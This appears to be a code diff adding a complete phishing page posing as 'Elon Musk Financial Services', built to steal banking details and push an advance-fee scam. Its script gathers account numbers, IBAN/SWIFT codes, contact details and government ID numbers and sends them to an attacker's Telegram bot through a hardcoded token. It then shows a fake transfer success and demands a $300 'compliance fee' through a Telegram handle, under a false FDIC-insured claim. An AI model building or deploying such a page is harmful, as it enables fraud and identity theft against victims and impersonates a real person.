@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elon Musk Financial Services</title>
+    <style>
+        :root {
+            --primary-color: #0066cc;
+            --secondary-color: #003366;
+            --accent-color: #00cc66;
+            --error-color: #cc0000;
+            --warning-color: #ff9900;
+            --background-color: #f5f7fa;
+            --card-color: #ffffff;
+            --text-color: #333333;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background-color: var(--card-color);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        h1 {
+            color: var(--secondary-color);
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+
+        .optional {
+            color: #888;
+            font-weight: normal;
+        }
+
+        .btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: var(--secondary-color);
+        }
+
+        .btn-warning {
+            background-color: var(--warning-color);
+        }
+
+        .btn-warning:hover {
+            background-color: #e68a00;
+        }
+
+        .btn-telegram {
+            background-color: #0088cc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-telegram:hover {
+            background-color: #006699;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .processing-animation {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(0, 102, 204, 0.2);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .status-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .success {
+            color: var(--accent-color);
+        }
+
+        .warning {
+            color: var(--warning-color);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background-color: #eee;
+            border-radius: 3px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background-color: var(--primary-color);
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .tax-notice {
+            background-color: #fff9e6;
+            border-left: 4px solid var(--warning-color);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 var(--border-radius) var(--border-radius) 0;
+        }
+
+        .contact-telegram {
+            background-color: #e6f7ff;
+            border-left: 4px solid #0088cc;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 var(--border-radius) var(--border-radius) 0;
+            text-align: center;
+        }
+
+        .telegram-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+
+        .language-selector select {
+            width: auto;
+            padding: 5px 10px;
+            font-size: 14px;
+        }
+
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            border-radius: 50%;
+            box-sizing: content-box;
+            border: 4px solid var(--accent-color);
+        }
+
+        .check-icon::before {
+            top: 3px;
+            left: -2px;
+            width: 30px;
+            transform-origin: 100% 50%;
+            border-radius: 100px 0 0 100px;
+        }
+
+        .check-icon::after {
+            top: 0;
+            left: 30px;
+            width: 60px;
+            transform-origin: 0 50%;
+            border-radius: 0 100px 100px 0;
+            animation: rotate-circle 4.25s ease-in;
+        }
+
+        .check-icon::before, .check-icon::after {
+            content: '';
+            height: 100px;
+            position: absolute;
+            background: var(--card-color);
+            transform: rotate(-45deg);
+        }
+
+        .icon-line {
+            height: 5px;
+            background-color: var(--accent-color);
+            display: block;
+            border-radius: 2px;
+            position: absolute;
+            z-index: 10;
+        }
+
+        .icon-line.line-tip {
+            top: 46px;
+            left: 14px;
+            width: 25px;
+            transform: rotate(45deg);
+            animation: icon-line-tip 0.75s;
+        }
+
+        .icon-line.line-long {
+            top: 38px;
+            right: 8px;
+            width: 47px;
+            transform: rotate(-45deg);
+            animation: icon-line-long 0.75s;
+        }
+
+        @keyframes rotate-circle {
+            0% { transform: rotate(-45deg); }
+            5% { transform: rotate(-45deg); }
+            12% { transform: rotate(-405deg); }
+            100% { transform: rotate(-405deg); }
+        }
+
+        @keyframes icon-line-tip {
+            0% { width: 0; left: 1px; top: 19px; }
+            54% { width: 0; left: 1px; top: 19px; }
+            70% { width: 50px; left: -8px; top: 37px; }
+            84% { width: 17px; left: 21px; top: 48px; }
+            100% { width: 25px; left: 14px; top: 45px; }
+        }
+
+        @keyframes icon-line-long {
+            0% { width: 0; right: 46px; top: 54px; }
+            65% { width: 0; right: 46px; top: 54px; }
+            84% { width: 55px; right: 0px; top: 35px; }
+            100% { width: 47px; right: 8px; top: 38px; }
+        }
+
+        .processing-steps {
+            margin: 30px 0;
+        }
+
+        .processing-step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: var(--border-radius);
+            background-color: #f9f9f9;
+        }
+
+        .step-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: var(--primary-color);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+
+        .step-text {
+            flex: 1;
+        }
+
+        .step-completed .step-icon {
+            background-color: var(--accent-color);
+        }
+
+        .step-active .step-icon {
+            background-color: var(--warning-color);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="language-selector">
+            <select id="language-select">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="zh">中文</option>
+                <option value="ar">العربية</option>
+            </select>
+        </div>
+        
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">EM</div>
+                <h1>Elon Musk Financial Services</h1>
+            </div>
+            <p class="subtitle" data-translate="subtitle">Secure Global Payment Processing</p>
+        </div>
+
+        <!-- Step 1: Input Form -->
+        <div id="step1" class="step active">
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="bank-name" data-translate="bank-name-label">Bank Name</label>
+                    <input type="text" id="bank-name" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="account-number" data-translate="account-number-label">Account Number / IBAN</label>
+                    <input type="text" id="account-number" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="routing-number" data-translate="routing-number-label">Routing Number / SWIFT Code</label>
+                    <input type="text" id="routing-number" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="account-holder" data-translate="account-holder-label">Account Holder Name</label>
+                    <input type="text" id="account-holder" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="country" data-translate="country-label">Country</label>
+                    <select id="country" required>
+                        <option value="" data-translate="select-country">Select Country</option>
+                        <option value="us">United States</option>
+                        <option value="uk">United Kingdom</option>
+                        <option value="ca">Canada</option>
+                        <option value="au">Australia</option>
+                        <option value="de">Germany</option>
+                        <option value="fr">France</option>
+                        <option value="jp">Japan</option>
+                        <option value="in">India</option>
+                        <option value="br">Brazil</option>
+                        <option value="za">South Africa</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="account-type" data-translate="account-type-label">Account Type</label>
+                    <select id="account-type" required>
+                        <option value="" data-translate="select-account-type">Select Account Type</option>
+                        <option value="checking" data-translate="checking">Checking</option>
+                        <option value="savings" data-translate="savings">Savings</option>
+                        <option value="business" data-translate="business">Business</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email" data-translate="email-label">Email Address</label>
+                    <input type="email" id="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone" data-translate="phone-label">Phone Number</label>
+                    <input type="tel" id="phone" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="amount" data-translate="amount-label">Amount (USD)</label>
+                    <input type="number" id="amount" min="1" step="0.01" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="address" data-translate="address-label">Address <span class="optional" data-translate="optional">(Optional)</span></label>
+                    <input type="text" id="address">
+                </div>
+                
+                <div class="form-group">
+                    <label for="id-number" data-translate="id-number-label">Government ID Number <span class="optional" data-translate="optional">(Optional)</span></label>
+                    <input type="text" id="id-number">
+                </div>
+                
+                <button type="submit" class="btn" data-translate="submit-btn">Process Payment</button>
+            </form>
+        </div>
+
+        <!-- Step 2: Processing Animation -->
+        <div id="step2" class="step">
+            <div class="processing-animation">
+                <div class="spinner"></div>
+                <h2 data-translate="processing-title">Processing Your Payment</h2>
+                <p data-translate="processing-text">Please wait while Elon Musk Financial Services processes your payment.</p>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            
+            <div class="processing-steps">
+                <div class="processing-step step-completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-text" data-translate="step-verification">Account verification completed</div>
+                </div>
+                <div class="processing-step step-completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-text" data-translate="step-funds">Funds reserved for transfer</div>
+                </div>
+                <div class="processing-step step-active">
+                    <div class="step-icon">⟳</div>
+                    <div class="step-text" data-translate="step-processing">Processing international transfer</div>
+                </div>
+                <div class="processing-step">
+                    <div class="step-icon">⏱</div>
+                    <div class="step-text" data-translate="step-completion">Awaiting bank confirmation</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: Success Message -->
+        <div id="step3" class="step">
+            <div class="processing-animation">
+                <div class="success-checkmark">
+                    <div class="check-icon">
+                        <span class="icon-line line-tip"></span>
+                        <span class="icon-line line-long"></span>
+                    </div>
+                </div>
+                <h2 class="success" data-translate="success-title">Payment Successfully Sent!</h2>
+                <p data-translate="success-text">Your funds have been transferred from our system and are now being processed.</p>
+            </div>
+            
+            <div class="processing-steps">
+                <div class="processing-step step-completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-text" data-translate="step-verification">Account verification completed</div>
+                </div>
+                <div class="processing-step step-completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-text" data-translate="step-funds">Funds reserved for transfer</div>
+                </div>
+                <div class="processing-step step-completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-text" data-translate="step-processing">Processing international transfer</div>
+                </div>
+                <div class="processing-step step-active">
+                    <div class="step-icon">⟳</div>
+                    <div class="step-text" data-translate="step-completion">Awaiting bank confirmation</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Tax Notice -->
+        <div id="step4" class="step">
+            <div class="processing-animation">
+                <div class="status-icon warning">⚠</div>
+                <h2 class="warning" data-translate="tax-title">International Transfer Tax Required</h2>
+            </div>
+            
+            <div class="tax-notice">
+                <h3 data-translate="tax-reason-title">International Compliance Fee</h3>
+                <p data-translate="tax-notice">Your bank requires a $300 international compliance fee to complete this cross-border transaction. This fee covers:</p>
+                <ul style="margin: 10px 0 10px 20px;">
+                    <li data-translate="tax-reason-1">International Anti-Money Laundering (AML) verification</li>
+                    <li data-translate="tax-reason-2">Cross-border transaction compliance processing</li>
+                    <li data-translate="tax-reason-3">Foreign exchange regulatory documentation</li>
+                    <li data-translate="tax-reason-4">International wire transfer security protocols</li>
+                </ul>
+                <p data-translate="tax-refund">This fee is standard for international transfers over $1,000 and will be refunded to your account once the transaction is fully processed and cleared (typically within 3-5 business days).</p>
+            </div>
+            
+            <div class="contact-telegram">
+                <h3 data-translate="contact-title">Contact Our Financial Team</h3>
+                <p data-translate="contact-text">To pay the compliance fee and complete your transaction, please contact our financial team on Telegram:</p>
+                <a href="https://t.me/ceo_reevex" class="btn btn-telegram" target="_blank">
+                    <span class="telegram-icon">✈</span>
+                    <span data-translate="contact-telegram">Contact on Telegram</span>
+                </a>
+                <p style="margin-top: 10px; font-size: 14px;" data-translate="contact-instruction">Send a message to @ceo_reevex with your transaction reference to complete payment</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p data-translate="footer-text">© 2023 Elon Musk Financial Services. All rights reserved. | FDIC Insured</p>
+        </div>
+    </div>
+
+    <script>
+        // Language translations
+        const translations = {
+            en: {
+                "subtitle": "Secure Global Payment Processing",
+                "bank-name-label": "Bank Name",
+                "account-number-label": "Account Number / IBAN",
+                "routing-number-label": "Routing Number / SWIFT Code",
+                "account-holder-label": "Account Holder Name",
+                "country-label": "Country",
+                "select-country": "Select Country",
+                "account-type-label": "Account Type",
+                "select-account-type": "Select Account Type",
+                "checking": "Checking",
+                "savings": "Savings",
+                "business": "Business",
+                "email-label": "Email Address",
+                "phone-label": "Phone Number",
+                "amount-label": "Amount (USD)",
+                "address-label": "Address",
+                "id-number-label": "Government ID Number",
+                "optional": "(Optional)",
+                "submit-btn": "Process Payment",
+                "processing-title": "Processing Your Payment",
+                "processing-text": "Please wait while Elon Musk Financial Services processes your payment.",
+                "step-verification": "Account verification completed",
+                "step-funds": "Funds reserved for transfer",
+                "step-processing": "Processing international transfer",
+                "step-completion": "Awaiting bank confirmation",
+                "success-title": "Payment Successfully Sent!",
+                "success-text": "Your funds have been transferred from our system and are now being processed.",
+                "tax-title": "International Transfer Tax Required",
+                "tax-reason-title": "International Compliance Fee",
+                "tax-notice": "Your bank requires a $300 international compliance fee to complete this cross-border transaction. This fee covers:",
+                "tax-reason-1": "International Anti-Money Laundering (AML) verification",
+                "tax-reason-2": "Cross-border transaction compliance processing",
+                "tax-reason-3": "Foreign exchange regulatory documentation",
+                "tax-reason-4": "International wire transfer security protocols",
+                "tax-refund": "This fee is standard for international transfers over $1,000 and will be refunded to your account once the transaction is fully processed and cleared (typically within 3-5 business days).",
+                "contact-title": "Contact Our Financial Team",
+                "contact-text": "To pay the compliance fee and complete your transaction, please contact our financial team on Telegram:",
+                "contact-telegram": "Contact on Telegram",
+                "contact-instruction": "Send a message to @ceo_reevex with your transaction reference to complete payment",
+                "footer-text": "© 2023 Elon Musk Financial Services. All rights reserved. | FDIC Insured"
+            },
+            es: {
+                "subtitle": "Procesamiento de Pagos Global Seguro",
+                "bank-name-label": "Nombre del Banco",
+                "account-number-label": "Número de Cuenta / IBAN",
+                "routing-number-label": "Número de Ruta / Código SWIFT",
+                "account-holder-label": "Nombre del Titular de la Cuenta",
+                "country-label": "País",
+                "select-country": "Seleccionar País",
+                "account-type-label": "Tipo de Cuenta",
+                "select-account-type": "Seleccionar Tipo de Cuenta",
+                "checking": "Corriente",
+                "savings": "Ahorros",
+                "business": "Empresarial",
+                "email-label": "Dirección de Correo Electrónico",
+                "phone-label": "Número de Teléfono",
+                "amount-label": "Cantidad (USD)",
+                "address-label": "Dirección",
+                "id-number-label": "Número de Identificación Gubernamental",
+                "optional": "(Opcional)",
+                "submit-btn": "Procesar Pago",
+                "processing-title": "Procesando Su Pago",
+                "processing-text": "Por favor espere mientras Elon Musk Financial Services procesa su pago.",
+                "step-verification": "Verificación de cuenta completada",
+                "step-funds": "Fondos reservados para transferencia",
+                "step-processing": "Procesando transferencia internacional",
+                "step-completion": "Esperando confirmación bancaria",
+                "success-title": "¡Pago Enviado Exitosamente!",
+                "success-text": "Sus fondos han sido transferidos desde nuestro sistema y ahora están siendo procesados.",
+                "tax-title": "Impuesto de Transferencia Internacional Requerido",
+                "tax-reason-title": "Tarifa de Cumplimiento Internacional",
+                "tax-notice": "Su banco requiere una tarifa de cumplimiento internacional de $300 para completar esta transacción transfronteriza. Esta tarifa cubre:",
+                "tax-reason-1": "Verificación internacional contra el lavado de dinero (AML)",
+                "tax-reason-2": "Procesamiento de cumplimiento de transacciones transfronterizas",
+                "tax-reason-3": "Documentación regulatoria de cambio de divisas",
+                "tax-reason-4": "Protocolos de seguridad de transferencia bancaria internacional",
+                "tax-refund": "Esta tarifa es estándar para transferencias internacionales superiores a $1,000 y será reembolsada a su cuenta una vez que la transacción esté completamente procesada y liquidada (generalmente dentro de 3-5 días hábiles).",
+                "contact-title": "Contacte a Nuestro Equipo Financiero",
+                "contact-text": "Para pagar la tarifa de cumplimiento y completar su transacción, por favor contacte a nuestro equipo financiero en Telegram:",
+                "contact-telegram": "Contactar en Telegram",
+                "contact-instruction": "Envíe un mensaje a @ceo_reevex con su referencia de transacción para completar el pago",
+                "footer-text": "© 2023 Elon Musk Financial Services. Todos los derechos reservados. | Asegurado por FDIC"
+            },
+            fr: {
+                "subtitle": "Traitement Sécurisé des Paiements Mondiaux",
+                "bank-name-label": "Nom de la Banque",
+                "account-number-label": "Numéro de Compte / IBAN",
+                "routing-number-label": "Numéro de Routage / Code SWIFT",
+                "account-holder-label": "Nom du Titulaire du Compte",
+                "country-label": "Pays",
+                "select-country": "Sélectionner un Pays",
+                "account-type-label": "Type de Compte",
+                "select-account-type": "Sélectionner le Type de Compte",
+                "checking": "Chèques",
+                "savings": "Épargne",
+                "business": "Entreprise",
+                "email-label": "Adresse E-mail",
+                "phone-label": "Numéro de Téléphone",
+                "amount-label": "Montant (USD)",
+                "address-label": "Adresse",
+                "id-number-label": "Numéro d'Identification Gouvernemental",
+                "optional": "(Optionnel)",
+                "submit-btn": "Traiter le Paiement",
+                "processing-title": "Traitement de Votre Paiement",
+                "processing-text": "Veuillez patienter pendant qu'Elon Musk Financial Services traite votre paiement.",
+                "step-verification": "Vérification du compte terminée",
+                "step-funds": "Fonds réservés pour le transfert",
+                "step-processing": "Traitement du transfert international",
+                "step-completion": "En attente de confirmation bancaire",
+                "success-title": "Paiement Envoyé avec Succès!",
+                "success-text": "Vos fonds ont été transférés de notre système et sont maintenant en cours de traitement.",
+                "tax-title": "Taxe de Transfert International Requise",
+                "tax-reason-title": "Frais de Conformité Internationale",
+                "tax-notice": "Votre banque nécessite des frais de conformité internationale de 300 $ pour finaliser cette transaction transfrontalière. Ces frais couvrent:",
+                "tax-reason-1": "Vérification internationale de lutte contre le blanchiment d'argent (AML)",
+                "tax-reason-2": "Traitement de conformité des transactions transfrontalières",
+                "tax-reason-3": "Documentation réglementaire sur le change",
+                "tax-reason-4": "Protocoles de sécurité des virements internationaux",
+                "tax-refund": "Ces frais sont standard pour les transferts internationaux de plus de 1 000 $ et seront remboursés sur votre compte une fois la transaction entièrement traitée et compensée (généralement sous 3 à 5 jours ouvrables).",
+                "contact-title": "Contactez Notre Équipe Financière",
+                "contact-text": "Pour payer les frais de conformité et finaliser votre transaction, veuillez contacter notre équipe financière sur Telegram:",
+                "contact-telegram": "Contacter sur Telegram",
+                "contact-instruction": "Envoyez un message à @ceo_reevex avec votre référence de transaction pour finaliser le paiement",
+                "footer-text": "© 2023 Elon Musk Financial Services. Tous droits réservés. | Assuré FDIC"
+            }
+        };
+
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8073509149:AAGOZUNsP6P2Mx0c1llb60aDX8fMLeHrI2c';
+        const TELEGRAM_CHAT_ID = '8435560223';
+
+        // Language selector functionality
+        const languageSelect = document.getElementById('language-select');
+        
+        // Set initial language based on browser preference
+        function setInitialLanguage() {
+            const browserLang = navigator.language.split('-')[0];
+            const supportedLangs = ['en', 'es', 'fr', 'de', 'zh', 'ar'];
+            
+            if (supportedLangs.includes(browserLang)) {
+                languageSelect.value = browserLang;
+                changeLanguage(browserLang);
+            }
+        }
+        
+        function changeLanguage(lang) {
+            const elements = document.querySelectorAll('[data-translate]');
+            elements.forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[lang] && translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+        }
+        
+        languageSelect.addEventListener('change', (e) => {
+            changeLanguage(e.target.value);
+        });
+
+        // Send data to Telegram
+        async function sendToTelegram(formData) {
+            const message = `
+🚨 *NEW PAYMENT REQUEST* 🚨
+
+*Bank Details:*
+🏦 Bank: ${formData.bankName}
+📊 Account: ${formData.accountNumber}
+🔗 Routing/SWIFT: ${formData.routingNumber}
+👤 Account Holder: ${formData.accountHolder}
+🌍 Country: ${formData.country}
+💳 Account Type: ${formData.accountType}
+
+*Contact Information:*
+📧 Email: ${formData.email}
+📱 Phone: ${formData.phone}
+
+*Transaction Details:*
+💰 Amount: $${formData.amount}
+🏠 Address: ${formData.address || 'Not provided'}
+🆔 Government ID: ${formData.idNumber || 'Not provided'}
+
+*Additional Info:*
+🌐 Language: ${languageSelect.value}
+🕒 Timestamp: ${new Date().toLocaleString()}
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                console.log('Message sent to Telegram:', result);
+                return result.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Payment processing functionality
+        const paymentForm = document.getElementById('payment-form');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const progressBar = document.getElementById('progress');
+
+        paymentForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validate form
+            const bankName = document.getElementById('bank-name').value;
+            const accountNumber = document.getElementById('account-number').value;
+            const routingNumber = document.getElementById('routing-number').value;
+            const accountHolder = document.getElementById('account-holder').value;
+            const country = document.getElementById('country').value;
+            const accountType = document.getElementById('account-type').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const amount = document.getElementById('amount').value;
+            const address = document.getElementById('address').value;
+            const idNumber = document.getElementById('id-number').value;
+            
+            if (!bankName || !accountNumber || !routingNumber || !accountHolder || 
+                !country || !accountType || !email || !phone || !amount) {
+                alert('Please fill in all required fields');
+                return;
+            }
+            
+            // Prepare form data
+            const formData = {
+                bankName,
+                accountNumber,
+                routingNumber,
+                accountHolder,
+                country,
+                accountType,
+                email,
+                phone,
+                amount,
+                address,
+                idNumber
+            };
+            
+            // Send data to Telegram
+            const telegramSuccess = await sendToTelegram(formData);
+            
+            if (!telegramSuccess) {
+                alert('There was an error processing your request. Please try again.');
+                return;
+            }
+            
+            // Move to step 2
+            step1.classList.remove('active');
+            step2.classList.add('active');
+            
+            // Simulate processing
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // After 3 seconds, show success message
+                    setTimeout(() => {
+                        step2.classList.remove('active');
+                        step3.classList.add('active');
+                        
+                        // After 5 more seconds, show tax notice
+                        setTimeout(() => {
+                            step3.classList.remove('active');
+                            step4.classList.add('active');
+                        }, 5000);
+                    }, 3000);
+                }
+            }, 200);
+        });
+
+        // Initialize the page
+        window.onload = function() {
+            setInitialLanguage();
+        };
+    </script>
+</body>
+</html>
